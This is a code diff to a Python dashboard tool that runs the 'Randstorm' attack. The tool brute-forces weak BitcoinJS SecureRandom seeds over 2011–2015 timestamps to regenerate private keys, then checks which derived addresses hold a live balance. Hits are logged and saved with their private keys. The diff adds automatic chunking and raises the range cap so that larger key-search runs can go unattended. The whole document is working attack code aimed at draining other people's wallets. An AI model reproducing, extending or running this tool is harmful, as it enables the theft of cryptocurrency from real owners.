@@ -144,6 +144,11 @@ AUTO_VERIFY_HITS = os.environ.get(
 # Minimum combined chain+mempool sats required to save a hit. Default 1 skips
 # zero-balance candidates; 0 keeps them with balance fields attached.
 AUTO_VERIFY_MIN_SATS = _env_int("AUTO_VERIFY_MIN_SATS", 1, 0)
+# Automatic Randstorm chunking. The UI accepts larger ranges and the job splits
+# them into sequential chunks, so one run cannot lock the dashboard forever.
+RANDSTORM_MAX_MS        = max(1000, _env_int("RANDSTORM_MAX_MS", 5_000_000, 1000))
+RANDSTORM_MAX_TOTAL_MS  = max(RANDSTORM_MAX_MS,
+                              _env_int("RANDSTORM_MAX_TOTAL_MS", 50_000_000, 1000))
 PORT       = int(os.environ.get("PORT", 5000))
 GENESIS_TS = 1293840000000  # 2011-01-01 ms
 CUTOFF_TS  = 1420070400000  # 2015-01-01 ms
@@ -877,39 +882,68 @@ def _bitcoinjs_securerandom(seed_ms):
     S = _rc4_init(pool)
     return _rc4_bytes(S, 32)
 
+def _randstorm_chunks(start_ms, end_ms, chunk_ms):
+    """Yield inclusive [start, end] chunks no larger than chunk_ms."""
+    step = max(1, int(chunk_ms))
+    start = int(start_ms)
+    while start <= end_ms:
+        end = min(int(end_ms), start + step - 1)
+        yield start, end
+        start = end + 1
+
+
 def attack_randstorm(start_ms, end_ms, bf, log, job):
-    """Iterate timestamp range, derive keys, live-check bloom candidates."""
-    total = end_ms - start_ms + 1
-    log(f"[randstorm] {start_ms}..{end_ms}  ({total:,} timestamps)")
-    hits = []; skipped = 0; t0 = time.time()
-    for i, ts in enumerate(range(start_ms, end_ms + 1)):
-        if job["stop"]: log("[randstorm] stopped"); break
-        try:
-            pk = int.from_bytes(_bitcoinjs_securerandom(ts), 'big') % N
-            if pk == 0: continue
-            for label, addr in derive_addresses(pk):
-                h = _address_to_hash160(addr)
-                if h and h in bf:
-                    hit = {"ts": ts, "privkey": hex(pk), "address": addr,
-                           "type": label, "found_at": datetime.now(timezone.utc).isoformat()}
-                    save, hit, note = _balance_gate(
-                        hit, log, job, lambda: job["stop"])
-                    if not save:
-                        if note == "stopped":
-                            log("[randstorm] stopped")
-                            return hits
-                        skipped += 1
-                        continue
-                    hits.append(hit)
-                    log(f"  ★★★ HIT {addr}  privkey={hex(pk)}  ts={ts}  {note}")
-                    _save_result("randstorm", hit)
-        except Exception:
-            pass
-        if i % 500 == 0:
-            rate = (i + 1) / max(time.time() - t0, 0.001)
-            job["progress"] = (i + 1) / total
-            job["detail"] = (f"{i+1:,}/{total:,}  {rate:.0f} ts/s  "
-                             f"hits={len(hits)}  skipped={skipped}")
+    """Iterate a range in capped chunks, derive keys, live-check candidates."""
+    total = int(end_ms) - int(start_ms) + 1
+    if total <= 0:
+        return []
+    chunks = list(_randstorm_chunks(start_ms, end_ms, RANDSTORM_MAX_MS))
+    chunk_count = len(chunks)
+    log(f"[randstorm] {start_ms}..{end_ms}  ({total:,} timestamps, "
+        f"{chunk_count:,} chunk(s) of at most {RANDSTORM_MAX_MS:,} ms)")
+    hits = []; skipped = 0; t0 = time.time(); base_done = 0
+    for chunk_no, (chunk_start, chunk_end) in enumerate(chunks, 1):
+        if job["stop"]:
+            log("[randstorm] stopped")
+            break
+        chunk_total = chunk_end - chunk_start + 1
+        log(f"[randstorm] chunk {chunk_no}/{chunk_count}: {chunk_start}..{chunk_end} "
+            f"({chunk_total:,} timestamps)")
+        for i, ts in enumerate(range(chunk_start, chunk_end + 1)):
+            if job["stop"]:
+                log("[randstorm] stopped")
+                break
+            try:
+                pk = int.from_bytes(_bitcoinjs_securerandom(ts), 'big') % N
+                if pk == 0: continue
+                for label, addr in derive_addresses(pk):
+                    h = _address_to_hash160(addr)
+                    if h and h in bf:
+                        hit = {"ts": ts, "privkey": hex(pk), "address": addr,
+                               "type": label, "found_at": datetime.now(timezone.utc).isoformat()}
+                        save, hit, note = _balance_gate(
+                            hit, log, job, lambda: job["stop"])
+                        if not save:
+                            if note == "stopped":
+                                log("[randstorm] stopped")
+                                return hits
+                            skipped += 1
+                            continue
+                        hits.append(hit)
+                        log(f"  ★★★ HIT {addr}  privkey={hex(pk)}  ts={ts}  {note}")
+                        _save_result("randstorm", hit)
+            except Exception:
+                pass
+            if i % 500 == 0 or i == chunk_total - 1:
+                done = base_done + i + 1
+                elapsed = max(time.time() - t0, 0.001)
+                rate = done / elapsed
+                eta = (total - done) / max(rate, 0.001)
+                job["progress"] = done / total
+                job["detail"] = (f"{done:,}/{total:,} ts  chunk {chunk_no}/{chunk_count}  "
+                                 f"{rate:.0f} ts/s  hits={len(hits)}  skipped={skipped}  "
+                                 f"eta ~{eta/60:.1f} min")
+        base_done += chunk_total
     log(f"[randstorm] done — {len(hits)} hits, "
         f"{skipped} zero-balance candidate(s) skipped")
     return hits
@@ -2079,10 +2113,10 @@ def rs_page():
 <label>End (ms since epoch)</label>
 <input id="e" value="1293840001000">
 <p class="muted">2011-01-01 → 2015-01-01 is the vulnerable window, but that is
-126 billion timestamps and would take months. The default here is a 1,000 ms
-smoke test; raise it in small chunks (max 5,000,000 ms per run). Bloom
-candidates are live-checked for balance as found; zero-balance addresses are
-skipped by default.</p>
+126 billion timestamps and would take months. Larger ranges are split
+automatically into chunks of at most 5,000,000 ms and run in order; the total
+range cap is 50,000,000 ms by default. Bloom candidates are live-checked for
+balance as found; zero-balance addresses are skipped by default.</p>
 <button class="btn" onclick="start()">Start</button>
 <button class="btn danger" onclick="stop('randstorm')">Stop</button>
 </div>
@@ -2112,9 +2146,10 @@ def api_rs():
         return {"ok": False, "msg": "start and end must be integer ms timestamps"}
     if end < start:
         return {"ok": False, "msg": "end must be >= start"}
-    if end - start + 1 > 5_000_000:
+    if end - start + 1 > RANDSTORM_MAX_TOTAL_MS:
         return {"ok": False,
-                "msg": "range too large (max 5,000,000 ms per run) — split it up"}
+                "msg": (f"range too large (max {RANDSTORM_MAX_TOTAL_MS:,} ms total; "
+                        "set RANDSTORM_MAX_TOTAL_MS to raise it) — split it up")}
     try:
         bf = BloomFilter.load(BLOOM_PATH)
     except Exception as e:
